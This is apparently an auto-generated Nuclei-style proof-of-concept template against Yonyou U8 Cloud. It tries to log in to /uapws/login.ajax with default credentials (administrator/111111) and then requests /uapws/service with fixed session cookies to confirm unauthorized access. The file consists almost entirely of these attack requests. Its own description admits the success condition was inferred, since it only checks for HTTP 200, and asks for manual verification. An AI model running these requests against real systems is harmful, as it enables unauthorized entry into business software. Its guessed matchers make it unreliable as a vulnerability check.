id: poc-bb06585800fc8d52b23e
info:
  name: 用友U8Clouduapws存在未授权访问漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: unauth,2025
http:
- raw:
  - 'POST /uapws/login.ajax HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0

    Accept: */*

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded

    X-Requested-With: XMLHttpRequest

    Content-Length: 34

    Connection: close


    name=administrator&password=111111'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /uapws/service HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Connection: close

    Cookie: JSESSIONID=F5BB1DC04DAB3B423C599ABFD673C370.server; JSESSIONID=8546607005B11845176BBAA0C7A4DFB7.server

    Upgrade-Insecure-Requests: 1'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
